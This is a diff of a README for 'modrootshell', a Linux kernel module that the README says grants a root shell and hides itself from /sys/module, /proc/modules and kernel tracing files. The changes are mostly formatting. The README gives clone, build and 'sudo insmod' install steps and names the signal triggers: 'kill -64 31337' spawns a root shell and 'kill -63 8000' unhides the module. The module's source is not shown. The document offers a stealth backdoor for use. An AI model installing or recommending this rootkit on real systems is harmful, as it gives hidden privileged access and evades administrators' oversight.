@@ -1,10 +1,11 @@
 `A simple LKM which gives a rootshell. Also hides module from /sys/module and /proc/modules as well as kernel tracing files.`<br>
+`
 
-\# `git clone https://github.com/carls0n/modrootshell`<br>
-\# `cd modrootshell`<br>
-\# `make`<br>
-\# `sudo insmod modrootshell`<br><br>
-`kill -64 31337 [user defined number in source code] gives a rootshell`<br>
+`# git clone https://github.com/carls0n/modrootshell`<br>
+`# cd modrootshell`<br>
+`# make`<br>
+`# sudo insmod modrootshell`<br><br>
+`# kill -64 31337 [user defined number in source code] gives a rootshell`<br>
 
 `Must have module unhidden to uninstall`<br><br>
 `# kill -63 8000 (or whatever number you defined in source code)`<br>
